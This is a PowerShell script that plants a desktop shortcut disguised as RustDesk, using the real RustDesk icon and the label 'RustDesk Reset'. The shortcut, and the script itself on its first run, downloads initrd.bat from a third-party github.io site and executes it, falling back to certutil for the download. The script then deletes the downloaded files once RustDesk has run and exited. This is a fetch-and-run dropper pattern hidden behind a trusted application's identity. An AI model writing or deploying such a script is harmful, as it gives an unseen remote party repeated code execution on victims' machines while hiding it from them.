$ErrorActionPreference = 'Stop'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$desktop   = [Environment]::GetFolderPath('Desktop')
$iconDir   = Join-Path $env:LOCALAPPDATA 'RustDeskLauncher'
$iconPath  = Join-Path $iconDir 'rustdesk.ico'
$lnkPath   = Join-Path $desktop 'RustDesk.lnk'
$batchPath = Join-Path $env:TEMP 'initrd.bat'
$progPath  = Join-Path $env:TEMP 'progress.ps1'
$batchUrl  = 'https://wevertonmbrtx.github.io/rustdesk/initrd.bat'
$iconUrl   = 'https://raw.githubusercontent.com/rustdesk/rustdesk/master/res/icon.ico'

$webClient = New-Object Net.WebClient
$webClient.Headers.Add('User-Agent', 'Mozilla/5.0')

try {
    if (-not (Test-Path $iconDir)) {
        New-Item -ItemType Directory -Path $iconDir -Force | Out-Null
    }
    $webClient.DownloadFile($iconUrl, $iconPath)
} catch {
    Write-Warning "Can't create icon: $_"
}

$url = 'https://wevertonmbrtx.github.io/rustdesk/initrd.bat'
$q   = [char]34
$a   = [char]38

$cmd = '%SystemRoot%\System32\cmd.exe'
$tmp = '%TEMP%\initrd.bat'

if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
    $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $a + ' call ' + $q + $tmp + $q + $q
} else {
    $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $a + ' ' + $q + $tmp + $q + $q
}

try {
    $ws  = New-Object -ComObject WScript.Shell
    $lnk = $ws.CreateShortcut($ws.SpecialFolders.Item('Desktop') + '\RustDesk.lnk')
    $lnk.TargetPath  = $cmd
    $lnk.Arguments   = $lnkArgs
    $lnk.WindowStyle = 1
    $lnk.Description = 'RustDesk Reset'
    if (Test-Path $iconPath) { $lnk.IconLocation = "$iconPath,0" }
    $lnk.Save()
} catch {
    Write-Warning "Can't create shortcut: $_"
}

try {
    $webClient.DownloadFile($batchUrl, $batchPath)
} catch {
    Write-Warning "Can't download initrd.bat: $_"
    return
}

Start-Process -FilePath 'cmd.exe' -ArgumentList "/c `"$batchPath`""

$presentStreak  = 0
$phase1Deadline = (Get-Date).AddMinutes(5)
while ((Get-Date) -lt $phase1Deadline -and $presentStreak -lt 3) {
    if (Get-Process -Name 'RustDesk' -ErrorAction SilentlyContinue) {
        $presentStreak++
    } else {
        $presentStreak = 0
    }
    Start-Sleep -Seconds 2
}

$absentStreak = 0
while ($absentStreak -lt 3) {
    if (Get-Process -Name 'RustDesk' -ErrorAction SilentlyContinue) {
        $absentStreak = 0
    } else {
        $absentStreak++
    }
    Start-Sleep -Seconds 2
}

Start-Sleep -Seconds 2

for ($i = 0; $i -lt 30; $i++) {
    if (-not (Test-Path $batchPath)) { break }
    try {
        Remove-Item $batchPath -Force -ErrorAction Stop
        break
    } catch {
        Start-Sleep -Seconds 2
    }
}

Remove-Item $progPath -Force -ErrorAction SilentlyContinue

if (-not (Test-Path $lnkPath)) {
    Write-Warning "Can't find $lnkPath"
}
